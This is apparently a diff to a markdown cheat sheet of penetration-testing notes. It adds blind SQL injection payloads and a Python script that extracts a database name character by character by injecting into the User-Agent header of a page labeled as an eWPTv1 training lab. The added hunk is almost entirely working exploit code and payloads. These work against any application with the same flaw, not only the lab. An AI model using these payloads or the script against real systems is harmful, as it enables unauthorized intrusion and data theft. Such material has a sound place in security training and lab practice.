@@ -456,6 +456,33 @@ for i in range (1,41):
                         print(hashedPW)                     
 ```
 
+Check for the first character of the database name: ```' and substr(database(),1,1)='a' -- - ``` \
+Check for the second character of the database name: ```' and substr(database(),2,1)='a' -- - ``` \
+Simple script to automate database name retrieval: (Blind SQL Injection eWPTv1 lab): \
+```
+#! /usr/bin/python3
+import requests
+
+url = "http://1.lab.sqli.site/getBrowserInfo.php"
+chars = "abcdefghijklmnopqrstuvwxyz0123456789_-!"
+dbName = ""
+
+for index in range (1,16): # DB name 15 characters long
+	for each in chars:
+		payload = f"' AND substr(database(),{index},1)='{each}'-- -"
+		headers = {
+			'User-Agent': payload
+			}
+		r = requests.get(url, headers = headers)
+		if (len(r.text) == 16):
+			dbName += each
+			print(f"Character matched! {each}")
+			break
+		else:
+			print("Testing next character: " + dbName + each + '*' )
+print(f"Database name: {dbName}")
+```
+
 
 ## Serilisation/Deserialisation Exploit
 
